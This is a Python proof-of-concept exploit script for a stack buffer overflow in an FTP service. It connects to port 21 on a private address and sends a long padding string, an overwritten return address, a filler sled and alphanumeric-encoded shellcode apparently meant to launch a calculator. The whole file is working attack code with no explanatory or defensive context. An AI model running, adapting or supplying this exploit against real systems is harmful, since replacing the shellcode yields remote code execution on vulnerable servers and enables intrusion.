#!/usr/bin/env python
import socket

fuzzer = 2008* '\x41'
eip = '\x53\x93\x37\x7E' #7E379353 #4* '\x42'
nop = 20* '\x43'
calc = (
            "\x89\xe2\xda\xd3\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
            "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
            "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
            "\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
            "\x69\x6c\x6d\x38\x6d\x52\x35\x50\x43\x30\x77\x70\x73\x50\x6d"
            "\x59\x6b\x55\x30\x31\x79\x50\x51\x74\x4e\x6b\x52\x70\x64\x70"
            "\x6c\x4b\x76\x32\x56\x6c\x6e\x6b\x66\x32\x42\x34\x4c\x4b\x53"
            "\x42\x45\x78\x34\x4f\x78\x37\x51\x5a\x71\x36\x56\x51\x49\x6f"
            "\x6e\x4c\x75\x6c\x71\x71\x73\x4c\x44\x42\x36\x4c\x47\x50\x6f"
            "\x31\x68\x4f\x64\x4d\x55\x51\x4b\x77\x58\x62\x4b\x42\x36\x32"
            "\x61\x47\x6c\x4b\x62\x72\x66\x70\x6e\x6b\x30\x4a\x45\x6c\x4e"
            "\x6b\x72\x6c\x57\x61\x52\x58\x4d\x33\x32\x68\x66\x61\x38\x51"
            "\x73\x61\x4c\x4b\x30\x59\x67\x50\x75\x51\x5a\x73\x4e\x6b\x71"
            "\x59\x74\x58\x4b\x53\x56\x5a\x32\x69\x6c\x4b\x34\x74\x4e\x6b"
            "\x33\x31\x58\x56\x46\x51\x39\x6f\x4e\x4c\x39\x51\x4a\x6f\x56"
            "\x6d\x75\x51\x7a\x67\x65\x68\x49\x70\x53\x45\x78\x76\x54\x43"
            "\x31\x6d\x68\x78\x35\x6b\x63\x4d\x47\x54\x70\x75\x48\x64\x70"
            "\x58\x4e\x6b\x76\x38\x51\x34\x46\x61\x49\x43\x70\x66\x6c\x4b"
            "\x44\x4c\x32\x6b\x6c\x4b\x66\x38\x67\x6c\x65\x51\x39\x43\x4e"
            "\x6b\x45\x54\x6c\x4b\x53\x31\x7a\x70\x6f\x79\x72\x64\x56\x44"
            "\x56\x44\x51\x4b\x31\x4b\x35\x31\x56\x39\x73\x6a\x53\x61\x39"
            "\x6f\x6b\x50\x43\x6f\x31\x4f\x50\x5a\x4c\x4b\x36\x72\x68\x6b"
            "\x4c\x4d\x73\x6d\x73\x5a\x77\x71\x4e\x6d\x6e\x65\x6e\x52\x53"
            "\x30\x65\x50\x63\x30\x50\x50\x31\x78\x66\x51\x4e\x6b\x32\x4f"
            "\x4d\x57\x4b\x4f\x68\x55\x6d\x6b\x4c\x30\x6e\x55\x39\x32\x63"
            "\x66\x61\x78\x79\x36\x6a\x35\x6d\x6d\x6f\x6d\x79\x6f\x7a\x75"
            "\x55\x6c\x36\x66\x61\x6c\x34\x4a\x6d\x50\x79\x6b\x39\x70\x33"
            "\x45\x33\x35\x4d\x6b\x73\x77\x76\x73\x50\x72\x70\x6f\x33\x5a"
            "\x65\x50\x70\x53\x69\x6f\x5a\x75\x30\x63\x53\x51\x32\x4c\x31"
            "\x73\x66\x4e\x70\x65\x33\x48\x42\x45\x75\x50\x41\x41"
         )
         #badcod '\x00\x0a\x0d'
def connection():
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.104",21))

def exploit():
    connection()
    s.recv(1204)
    s.send(fuzzer + eip + nop + calc)
    s.close()
exploit()